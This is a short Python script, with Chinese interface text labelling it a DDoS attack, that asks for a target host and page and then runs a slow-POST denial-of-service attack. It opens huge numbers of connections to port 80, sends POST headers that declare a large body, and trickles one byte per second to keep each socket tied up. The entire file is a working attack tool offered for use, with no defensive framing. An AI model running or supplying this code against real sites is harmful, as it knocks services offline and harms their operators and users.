import socket
import time
import threading
print("|\   |\    /---\    /---\ ")
print("| \  | \  /     \   |")
print("|  | | | |       |  \ ")
print("| /  | /  \     /    \ ")
print("|/   |/    \---/  \---| ")
print("DDOS攻击")
MAX_CONN=200000000000
PORT=80
HOST=input("攻击目标：")
PAGE=input("攻击页面：")
buf=("POST %s HTTP/1.1\r\n"
    "Host: %s\r\n"
    "Content-Length: 10000\r\n"
    "Cookie: dklkt_dos_test\r\n"
    "\r\n" % (PAGE,HOST))
socks=[]
print("正在准备攻击，3秒后将会开始对"+HOST+"的攻击")
time.sleep(3)
def conn_thread():
    global socks
    for i in range(0,MAX_CONN):
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        try:
            s.connect((HOST,PORT))
            s.send(buf.encode())
            print("成功！,conn=%d\n" % i)
            socks.append(s)
        except Exception as ex:
            print("失败！%s" % ex)
def send_thread():
    global socks
    while True:
        for s in socks:
            try:
                s.send("f".encode())
            except Exception as ex:
                print("异常！%s\n" % ex)
                socks.remove(s)
                s.close()
        time.sleep(1)
conn_th = threading.Thread(target=conn_thread,args=())
send_th = threading.Thread(target=send_thread,args=())
conn_th.start()
send_th.start()
